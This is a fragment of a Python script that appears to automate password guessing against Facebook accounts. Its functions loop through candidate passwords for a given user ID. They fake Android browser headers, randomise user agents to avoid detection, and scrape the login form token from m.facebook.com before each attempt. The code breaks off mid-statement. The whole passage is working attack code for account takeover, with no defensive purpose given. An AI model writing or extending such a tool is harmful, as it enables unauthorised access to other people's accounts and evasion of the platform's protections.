...
def x(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'x-fb-rev': '1007127514',
            'x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==',
            'content-length': '166',
            ...
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4253.93 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
...
def freeq(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(6,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            Session = requests.Session()
            free_fb = Session.get('https://m.facebook.com/').text
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
